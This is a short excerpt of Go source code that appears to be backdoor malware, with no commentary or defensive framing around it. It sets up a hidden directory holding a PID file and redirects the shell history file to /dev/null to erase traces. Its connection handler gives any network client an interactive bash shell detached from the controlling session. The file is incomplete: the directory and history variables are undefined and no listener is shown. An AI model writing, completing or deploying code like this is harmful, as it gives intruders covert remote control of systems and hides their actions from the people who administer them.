package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

func setupHiddenDir() error {
	if err := os.MkdirAll(hiddenDir, 0700); err != nil {
		return err
	}
	pidPath := filepath.Join(hiddenDir, ".pid")
	return os.WriteFile(pidPath, []byte(fmt.Sprintf("%d\n", os.Getpid())), 0600)
}

func ensureHistorySink() error {
	_, err := os.Lstat(historySink)
	if err == nil {
		if target, e := os.Readlink(historySink); e == nil && (target == "/dev/null" || target == "dev/null") {
			return nil
		}
	}
	os.Remove(historySink)
	return os.Symlink("/dev/null", historySink)
}

func handleConn(conn net.Conn) {
	defer conn.Close()
	env := os.Environ()
	env = append(env, "HISTFILE="+historySink)
	cmd := exec.Command("/bin/bash", "-i")
	cmd.Env = env
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
	_ = cmd.Run()
}
